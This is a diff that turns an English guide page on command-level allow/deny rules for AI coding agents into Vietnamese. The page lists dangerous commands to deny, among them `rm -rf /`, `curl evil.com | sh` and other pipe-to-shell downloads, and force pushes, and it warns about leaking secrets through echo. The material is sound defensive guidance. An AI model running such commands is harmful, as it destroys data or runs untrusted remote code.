@@ -1,67 +1,67 @@
 ---
-title: Command Rules
-description: Command-level allow/deny for shell and tool calls—more executable than verbal agreement.
+title: Quy tắc lệnh
+description: Dùng allow/deny cấp lệnh để ràng buộc shell và gọi công cụ — thực thi được hơn ước định miệng.
 locale: vi
-source_locale: en
-source_revision: a397cb9
-translation_status: fallback
-translated_at: '2026-07-28'
+source_locale: zh-CN
+source_revision: 5f36443
+translation_status: draft
+translated_at: 2026-07-28
 ---
 
-**Command rules** focus on “which commands the Agent may run and with what arguments.” They are the most common form of [Allow and Deny Rules](/guide/customization/rules/allow-and-deny-patterns/), usually in team-reviewable configuration or rule files.
+**Quy tắc lệnh** tập trung vào «Agent chạy được lệnh nào, với tham số nào». Chúng là hình thái phổ biến nhất của [quy tắc cho phép và từ chối](/guide/customization/rules/allow-and-deny-patterns/), thường viết trong cấu hình hoặc tệp quy tắc nhóm rà được.
 
-## What This Page Covers
+## Trang này sẽ nói gì
 
-- Division of labor among command rules, sandbox, and approval dialogs
-- How to write a “narrow enough” allowlist
-- Alignment with CI and local dev scripts
+- Phân công giữa quy tắc lệnh với Sandbox và hộp thoại phê duyệt
+- Cách viết allowlist «đủ hẹp»
+- Khớp với CI và script phát triển cục bộ
 
-## What Command Rules Control
+## Quy tắc lệnh thật sự đang quản gì
 
-If allow/deny states what is allowed in principle, command rules land that at the most concrete layer:
+Nếu allow/deny quy định “những việc nào về nguyên tắc làm được”, thì quy tắc lệnh đưa việc đó xuống tầng cụ thể nhất:
 
-- Which commands may run
-- Which may not
-- Which look similar but differ greatly in risk
+- Lệnh nào chạy được
+- Lệnh nào không chạy được
+- Lệnh nào trông gần giống nhau nhưng rủi ro khác rất nhiều
 
-The point is turning boundaries the team already knows into boundaries the machine can enforce.
+Trọng tâm là biến ranh giới nhóm vốn đã biết thành ranh giới máy cũng thực thi được.
 
-## One Core Concept First
+## Hiểu một khái niệm cốt lõi trước
 
-Rules match **executable intent**, not natural language. `npm test` and `npm run test` are two different commands in policy; `bash -c "rm -rf /"` must not pass because `bash` was allowed.
+Quy tắc khớp **ý định thực thi được**, không phải ngôn ngữ tự nhiên. `npm test` và `npm run test` về chiến lược là hai lệnh khác nhau; `bash -c "rm -rf /"` không được thông vì đã allow `bash`.
 
 ```text
-User task → model proposes command → rule engine → (pass) sandbox execution / (reject) approval or block
+Tác vụ người dùng → Mô hình đề xuất lệnh → Engine quy tắc → (qua) thực thi Sandbox / (từ chối) cần phê duyệt hoặc chặn
 ```
 
-## Common Misconceptions
+## Hiểu lầm thường gặp
 
-### Similar commands, different risk
+### Lệnh trông giống nhau không nghĩa rủi ro giống nhau
 
-Beginners often underestimate small differences.
+Người mới dễ nhất đánh giá thấp chính chút khác biệt giữa lệnh.
 
-For example:
+Ví dụ:
 
-- `git status` vs `git reset --hard`
-- `npm test` vs `npm publish`
-- `curl example.com` vs `curl example.com | sh`
+- `git status` và `git reset --hard`
+- `npm test` và `npm publish`
+- `curl example.com` và `curl example.com | sh`
 
-All look like “run something in the terminal,” but risk is not the same level.
+Đều trông như “chạy một lệnh trên terminal”, nhưng rủi ro hoàn toàn không cùng cấp.
 
-### Allowing a general entry point often opens too much
+### Cho phép một lối vào tổng thường bằng mở quá nhiều
 
-Allowing `bash`, `sh`, and similar general entry points may feel convenient.
+Ví dụ allow thẳng `bash`, `sh` kiểu lối vào tổng, người mới có thể thấy chỉ vì tiện.
 
-From a rules perspective, that usually allows many dangerous compositions afterward.
+Nhưng từ góc quy tắc, thường bằng mở luôn hàng loạt hành động nguy hiểm có thể ghép phía sau.
 
-## Minimum Viable Practice
+## Cách làm tối thiểu dùng được
 
-1. **Deny dangerous commands outside write operations by default**: `rm -rf`, `curl | bash`, `git push --force`
-2. **Allow common read-only/build commands in the project**: `git status`, `npm test`, `pnpm lint`
-3. **Put rules in Git**, consistent with “test commands” in `AGENTS.md`
-4. **Review rule changes in PR**, like Dockerfile changes
+1. **Mặc định từ chối lệnh nguy hiểm ngoài thao tác ghi**: `rm -rf`, `curl | bash`, `git push --force`
+2. **Cho phép lệnh chỉ đọc/build thường dùng trong dự án**: `git status`, `npm test`, `pnpm lint`
+3. **Đưa quy tắc vào Git**, khớp mô tả «lệnh kiểm thử» trong `AGENTS.md`
+4. **Trong PR review thay đổi quy tắc**, như sửa Dockerfile
 
-Illustrative (format per official configuration):
+Minh họa (định dạng lấy cấu hình chính thức làm chuẩn):
 
 ```json
 {
@@ -81,52 +81,52 @@ Illustrative (format per official configuration):
 }
 ```
 
-## Recommended Workflow
+## Quy trình khuyến nghị
 
-| Step | Practice |
+| Bước | Cách làm |
 |---|---|
-| Inventory | Extract real commands from `package.json` scripts, Makefile, CI workflow |
-| Layer | Organization deny baseline → project allow supplement → personal local exception (if any) |
-| Trial | Validate with low-risk tasks: “should approve does; should block blocks” |
-| Align | Local rules and [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) share source when possible |
+| Kiểm kê | Từ `package.json` scripts, Makefile, CI workflow trích lệnh thật |
+| Phân tầng | Deny đáy tổ chức → bổ sung allow dự án → ngoại lệ máy cá nhân (nếu có) |
+| Thử chạy | Dùng tác vụ rủi ro thấp xác nhận «nên cho thì cho, nên chặn thì chặn» |
+| Khớp | Quy tắc cục bộ và [GitHub Action](/guide/developer-platform/ci-cd/code-review-automation/) cố cùng nguồn |
 
-## Common Mistakes
+## Lỗi thường gặp
 
-- **Allowlist too wide**: allowing `bash`, `sh`, `sudo` is like allowing everything
-- **Only deny, no allow**: still many approvals; teams habitually click through
-- **Docs disagree**: `AGENTS.md` says `pnpm test`, rules only have `npm test`
-- **Ignore pipes and redirects**: `curl evil.com | sh` needs whole-command policy, not just the first token
+- **Allowlist quá rộng**: cho phép `bash`, `sh`, `sudo` tương đương mở hết
+- **Chỉ deny không allow**: vẫn bật nhiều phê duyệt, nhóm quen bấm hết thông
+- **Không khớp tài liệu**: `AGENTS.md` viết `pnpm test`, quy tắc chỉ có `npm test`
+- **Bỏ qua pipe và chuyển hướng**: `curl evil.com | sh` cần chiến lược tổng, không chỉ nhìn từ đầu tiên
 
-Command rules are not “memorizing commands”—they separate daily actions from commands that, once allowed, blow open the risk boundary.
+Quy tắc lệnh không phải đang “nhớ lệnh”, mà đang phân rõ lệnh nào chỉ là hành động hàng ngày, lệnh nào một khi mở có thể mở luôn ranh giới rủi ro.
 
-## Security Boundaries
+## Ranh giới an toàn
 
-- Command rules **cannot** replace branch protection and code review
-- Malicious prompts may induce the Agent to **attempt** over-privileged commands—keep sandbox defaults strict
-- Environment variables with keys or tokens should not leak because “echo was allowed”
+- Quy tắc lệnh **không** thay bảo vệ nhánh và code review
+- Prompt độc hại có thể dụ Agent **thử** lệnh vượt quyền — giữ Sandbox mặc định nghiêm
+- Biến môi trường chứa khóa, token không nên lộ vì «đã cho phép echo»
 
-## Acceptance Checklist
+## Danh sách nghiệm thu
 
-- [ ] You can list 3–5 “run daily” commands for this repo and reflect them in rules
-- [ ] High-risk commands like `git push` and forced reset are denied by default or need explicit approval
-- [ ] Rule changes go through PR and do not contradict `AGENTS.md`
+- [ ] Liệt kê được 3–5 lệnh «mỗi ngày phải chạy» của kho và thể hiện trong quy tắc
+- [ ] Lệnh rủi ro cao như `git push`, reset cưỡng bức mặc định từ chối hoặc cần phê duyệt tường minh
+- [ ] Thay đổi quy tắc đi PR, và không mâu thuẫn `AGENTS.md`
 
-## Related Chapters
+## Chương liên quan
 
-- [Allow and Deny Patterns](/guide/customization/rules/allow-and-deny-patterns/)
-- [Team Rules Policy](/guide/customization/rules/team-rules/)
-- [CLI Approval and Sandbox](/guide/cli/approvals-and-sandbox/)
-- [Permission Matrix](/guide/reference/permission-matrix/)
+- [Mẫu cho phép và từ chối](/guide/customization/rules/allow-and-deny-patterns/)
+- [Chiến lược quy tắc nhóm](/guide/customization/rules/team-rules/)
+- [Phê duyệt và Sandbox CLI](/guide/cli/approvals-and-sandbox/)
+- [Ma trận quyền](/guide/reference/permission-matrix/)
 
-## References
+## Nguồn tham khảo
 
 - stormzhang `15-permissions.md`, `18-config.md`
-- KimYx0207 permissions and configuration chapter
-- freestylefly/CodexGuide team playbook
+- Chương quyền và cấu hình KimYx0207
+- Playbook nhóm freestylefly/CodexGuide
 
 ---
 
-**Status:** verified  
-**Applicable products:** CLI / App  
-**Verification basis:** OpenAI’s current Codex CLI documentation still treats command execution, approval modes, and sandbox isolation as core security boundaries; this page positions command rules as an engineering pattern for separating high- and low-risk commands and marks the JSON snippet as illustrative, not official syntax.  
-**Last verified:** 2026-07-26
+**Trạng thái:** verified  
+**Sản phẩm áp dụng:** CLI / App  
+**Căn cứ kiểm chứng:** Tài liệu Codex CLI hiện tại của OpenAI vẫn coi thực thi lệnh, chế độ phê duyệt và cách ly Sandbox là ranh giới an toàn cốt lõi; trang này định vị quy tắc lệnh là mẫu kỹ thuật “tách quản lệnh rủi ro cao/thấp”, và đánh dấu đoạn JSON là minh họa, không viết cú pháp cụ thể thành sự kiện chính thức.  
+**Kiểm chứng gần nhất:** 2026-07-26
